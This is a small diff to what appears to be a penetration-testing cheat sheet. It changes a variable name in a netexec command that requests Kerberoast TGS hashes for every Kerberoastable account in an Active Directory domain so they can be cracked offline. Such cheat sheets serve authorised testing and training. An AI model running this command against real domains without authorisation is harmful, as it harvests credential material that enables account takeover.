@@ -147,7 +147,7 @@ var spn_value
 Request Kerberoast TGS hashes for all Kerberoastable accounts using netexec after the SPN has been written.
 
 ```sh title:"Kerberoast all SPNed accounts via netexec"
-nxc ldap "$rhost_ip" -d "$domain" -u "$user" $nxc_auth --kerberoasting kerberoastables.txt
+nxc ldap "$rhost_ip" -d "$domain" -u "$user" $auth_flags --kerberoasting kerberoastables.txt
 ```
 <!-- cheat
 import domain_ip
